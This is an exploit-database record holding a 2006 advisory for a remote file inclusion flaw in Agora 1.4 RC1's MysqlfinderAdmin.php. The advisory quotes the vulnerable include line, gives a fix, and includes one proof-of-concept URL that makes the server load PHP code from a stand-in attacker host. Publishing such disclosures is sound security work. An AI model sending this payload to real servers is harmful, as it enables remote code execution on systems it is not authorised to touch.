{
  "id": "2726",
  "title": "Agora 1.4 RC1 - &#039;MysqlfinderAdmin.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-7194",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_59$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_59$2006]Agora 1.4 RC1  \"$_SESSION[PATH_COMPOSANT]\" Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: November, 01nd 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv59-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: Agora\r\nversion\t\t: 1.4 RC1\r\nURL\t\t: http://www.agora.gouv.fr\r\n\r\nBased on the free software Spip, Agora is a free software of management of contents for \r\nInternet developed in php, which makes it possible to put in place and to manage quickly \r\nand with lower cost of the Internet sites, Intranet or extranet.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability in modules/Mysqlfinder/MysqlfinderAdmin.php\r\n--------------------------modules/Mysqlfinder/MysqlfinderAdmin.php----------\r\n....\r\n<?\r\ninclude_once($_SESSION[\"PATH_COMPOSANT\"].\"Commun/Template.inc\")\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$_SESSION[\"PATH_COMPOSANT\"]\" parameter in Mysqlfinder.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[agora-1.4-path]/modules/Mysqlfinder/MysqlfinderAdmin.php?_SESSION[PATH_COMPOSANT]=http://attacker.com/inject.txt?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Insert new line code :\r\n  ...\r\n  include_once 'MysqlfinderParam.inc';\r\n  ...\r\n  \r\n  Before include_once($_SESSION[\"PATH_COMPOSANT\"].\"Commun/Template.inc\")\r\n\r\n- Turn off register_globals\r\n- Turn off display_error to Hide Full Path Error\r\n\r\nTimeline :\r\n~~~~~~~~~\r\n\r\n01 - 11 - 2006 bugs found\r\n01 - 11 - 2006 vendor contacted\r\n07 - 11 - 2006 public disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-11-06]",
  "url": "https://www.exploit-db.com/exploits/2726"
}